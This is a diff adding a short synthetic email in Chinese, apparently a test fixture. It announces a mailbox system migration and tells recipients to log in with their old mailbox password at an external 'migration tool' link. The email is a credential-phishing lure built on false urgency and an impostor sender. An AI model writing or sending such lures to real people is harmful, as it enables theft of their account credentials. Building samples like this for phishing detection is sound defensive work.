@@ -1,0 +1,10 @@
+From: =?utf-8?B?6YKu5Lu26L+B56e7?= <move@mail-trans.example>
+To: it@corp.internal
+Date: Sat, 29 Aug 2026 10:18:00 +0800
+Message-ID: <0008-b6@synth.example>
+Subject: 邮箱系统搬迁通知
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+旧邮箱本周五停用，历史邮件请自行搬迁移导：
+迁移工具（需旧邮箱密码登录）：https://mail-mover.example.net/import
